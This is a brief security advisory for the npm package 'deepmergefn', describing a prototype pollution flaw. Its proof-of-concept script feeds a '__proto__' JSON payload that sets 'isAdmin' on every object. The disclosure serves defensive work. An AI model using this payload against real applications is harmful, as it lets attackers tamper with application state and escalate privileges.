# Overview
`deepmergefn` is a NPM package function to deep merge object width diferent atribute.

Affected versions of this package are vulnerable to Prototype Pollution. 
It can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.


# Proof of Concept

```js
// poc.js
const deepMerge = require("deepmergefn");

console.log("Before:", {}.isAdmin);
deepMerge({}, JSON.parse('{ "__proto__" : { "isAdmin" : true } }'));
console.log("After:", isAdmin);
```
